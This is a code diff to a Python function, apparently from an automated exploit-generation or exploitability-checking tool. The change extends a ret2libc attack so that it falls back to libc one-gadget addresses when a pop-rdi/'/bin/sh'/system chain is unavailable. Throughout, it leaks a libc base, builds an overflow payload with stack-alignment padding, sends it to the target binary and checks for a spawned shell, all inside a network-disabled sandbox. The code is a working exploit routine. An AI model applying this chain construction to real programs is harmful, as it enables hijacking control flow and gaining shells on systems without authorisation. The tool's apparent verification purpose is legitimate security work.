@@ -315,15 +315,31 @@ def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_
     ret_g = rop.find_gadget(libc_data, "ret")
     binsh = rop.find_string(libc_data, b"/bin/sh")
     system = rop.libc_symbols(libc_data, ("system",)).get("system")
-    if not (pop_rdi and binsh and system):
-        return {"ok": False, "reason": "libc lacks a pop-rdi gadget / \"/bin/sh\" / system"}
-    rx = _re.compile(leak_regex.encode("latin-1"))
     q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
+    # The redirect tail, tried in order. Preferred: pop-rdi; "/bin/sh"; system. Fallback: a libc
+    # one-gadget (a single address that execve's "/bin/sh" when rsi/rdx are NULL) -- covers targets
+    # whose libc lacks a clean pop-rdi/system pairing, and older glibc where one-gadgets are common.
+    # An unusable gadget (its register constraint does not hold at the hijack) simply fails to spawn
+    # a shell and the next tail is tried; the live-shell check never mints a false positive.
+    tails = []
+    if pop_rdi and binsh and system:
+        tails.append(("system", lambda base, pad: ((q(base + ret_g) if ret_g else b"") if pad else b"")
+                                                  + q(base + pop_rdi) + q(base + binsh) + q(base + system)))
+    for g in rop.find_one_gadgets(libc_data)[:4]:
+        og = g["offset"]
+        tails.append((f"one_gadget@{hex(og)} [{g['constraint']}]",
+                      lambda base, pad, o=og: ((q(base + ret_g) if ret_g else b"") if pad else b"")
+                                              + q(base + o)))
+    if not tails:
+        return {"ok": False, "reason": "libc lacks a pop-rdi gadget / \"/bin/sh\" / system and has "
+                                       "no usable one-gadget"}
+    rx = _re.compile(leak_regex.encode("latin-1"))
     exedir = str(Path(exe).resolve().parent)
     argv = [str(a) for a in base_argv]
     last = None
-    for pad in (0, 1):                                            # stage alignment: even, then odd
-        for _ in range(3):
+    for tail_name, tail_fn in tails:
+      for pad in (0, 1):                                          # stage alignment: even, then odd
+        for _ in range(2):
             preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
             cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
             try:
@@ -361,10 +377,7 @@ def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_
                             break
                 if base is None:
                     continue
-                chain = bytearray(b"A" * offset)
-                if pad:
-                    chain += q(base + ret_g)
-                chain += q(base + pop_rdi) + q(base + binsh) + q(base + system)
+                chain = bytearray(b"A" * offset) + tail_fn(base, pad)
                 try:
                     p.stdin.write(bytes(chain))
                     p.stdin.flush()
@@ -375,9 +388,11 @@ def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_
                     break                                        # wrong parity: crashed
                 out = _read_until(p, time.time() + timeout, quiet=1.5)
                 if marker in out:
-                    return {"ok": True, "base": base, "system": base + system,
-                            "binsh": base + binsh, "pad": pad,
-                            "output": out[:400].decode("latin-1", "ignore")}
+                    r = {"ok": True, "base": base, "pad": pad, "tail": tail_name,
+                         "output": out[:400].decode("latin-1", "ignore")}
+                    if system:
+                        r["system"], r["binsh"] = base + system, base + binsh
+                    return r
             finally:
                 for s in (p.stdin, p.stdout):
                     try:
